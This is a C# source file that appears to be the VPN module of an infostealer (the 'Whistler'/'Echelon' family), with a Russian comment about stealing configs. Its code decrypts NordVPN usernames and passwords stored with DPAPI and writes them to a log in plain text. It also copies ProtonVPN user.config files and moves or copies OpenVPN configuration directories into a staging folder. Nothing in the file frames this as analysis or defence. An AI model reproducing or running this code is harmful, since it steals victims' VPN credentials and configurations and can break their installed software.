using Microsoft.Win32;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace Whistler.Classes.Targets
{
    class classVPN
    {
        public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData); //  Help.LocalData
        public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile); // Help.UserProfile

        class NordVPN
        {
            public static int count = 0;

            public static string NordVPNDir = "\\Vpn\\NordVPN";
            public static void Start(string Echelon_Dir)
            {
                try
                {
                    if (!Directory.Exists(LocalData + "\\NordVPN\\"))
                    {
                        return;

                    }
                    else
                    {
                        Directory.CreateDirectory(Echelon_Dir + NordVPNDir);


                    }

                    using (StreamWriter streamWriter = new StreamWriter(Echelon_Dir + "\\NVPN.log"))
                    {
                        DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(LocalData, "NordVPN"));
                        if (directoryInfo.Exists)
                        {

                            DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
                            for (int i = 0; i < directories.Length; i++)
                            {

                                foreach (DirectoryInfo directoryInfo2 in directories[i].GetDirectories())
                                {

                                    streamWriter.WriteLine("\tFound version " + directoryInfo2.Name);
                                    string text = Path.Combine(directoryInfo2.FullName, "user.config");
                                    if (File.Exists(text))
                                    {



                                        XmlDocument xmlDocument = new XmlDocument();
                                        xmlDocument.Load(text);
                                        string innerText = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText;
                                        string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText;
                                        if (innerText != null && !string.IsNullOrEmpty(innerText))
                                        {
                                            streamWriter.WriteLine("\t\tUsername: " + Nord_Vpn_Decoder(innerText));
                                        }
                                        if (innerText2 != null && !string.IsNullOrEmpty(innerText2))
                                        {
                                            streamWriter.WriteLine("\t\tPassword: " + Nord_Vpn_Decoder(innerText2));
                                        }
                                        count++;
                                    }
                                }
                            }

                        }
                    }
                }
                catch { }

            }

            public static string Nord_Vpn_Decoder(string s)
            {
                string result;
                try
                {
                    result = Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), null, DataProtectionScope.LocalMachine));
                }
                catch
                {
                    result = "";
                }
                return result;
            }
        }

        internal class ProtonVPN
        {
            public static int count = 0;
            public static void Start(string Echelon_Dir)
            {
                try
                {
                    string dir = LocalData;
                    if (Directory.Exists(dir + "\\ProtonVPN"))
                    {
                        string[] dirs = Directory.GetDirectories(dir + "" +
                            "\\ProtonVPN");
                        Directory.CreateDirectory(Echelon_Dir + "\\Vpn\\ProtonVPN\\");
                        foreach (string d1rs in dirs)
                        {
                            if (d1rs.StartsWith(dir + "\\ProtonVPN" + "\\ProtonVPN.exe"))
                            {
                                string dirName = new DirectoryInfo(d1rs).Name;
                                string[] d1 = Directory.GetDirectories(d1rs);
                                Directory.CreateDirectory(Echelon_Dir + "\\Vpn\\ProtonVPN\\" + dirName + "\\" + new DirectoryInfo(d1[0]).Name);
                                File.Copy(d1[0] + "\\user.config", Echelon_Dir + "\\Vpn\\ProtonVPN\\" + dirName + "\\" + new DirectoryInfo(d1[0]).Name + "\\user.config");
                                count++;
                            }
                        }
                    }
                }
                catch { }

            }
        }

        class OpenVPN
        {
            public static int count = 0;
            public static void Start(string Echelon_Dir)
            {
                try
                {
                    RegistryKey localMachineKey = Registry.LocalMachine;
                    string[] names = localMachineKey.OpenSubKey("SOFTWARE").GetSubKeyNames();
                    foreach (string i in names)
                    {
                        if (i == "OpenVPN")
                        {
                            Directory.CreateDirectory(Echelon_Dir + "\\VPN\\OpenVPN");
                            try
                            {
                                string dir = localMachineKey.OpenSubKey("SOFTWARE").OpenSubKey("OpenVPN").GetValue("config_dir").ToString();
                                DirectoryInfo dire = new DirectoryInfo(dir);
                                dire.MoveTo(Echelon_Dir + "\\VPN\\OpenVPN");
                                count++;
                            }
                            catch { }

                        }
                    }
                }
                catch { }
                //Стиллинг импортированных конфигов *New
                try
                {
                    foreach (FileInfo file in new DirectoryInfo(UserProfile + "\\OpenVPN\\config\\conf\\").GetFiles())

                    {
                        Directory.CreateDirectory(Echelon_Dir + "\\VPN\\OpenVPN\\config\\conf\\");
                        file.CopyTo(Echelon_Dir + "\\VPN\\OpenVPN\\config\\conf\\" + file.Name);
                    }
                    count++;
                }
                catch { }

            }
        }
    }
}
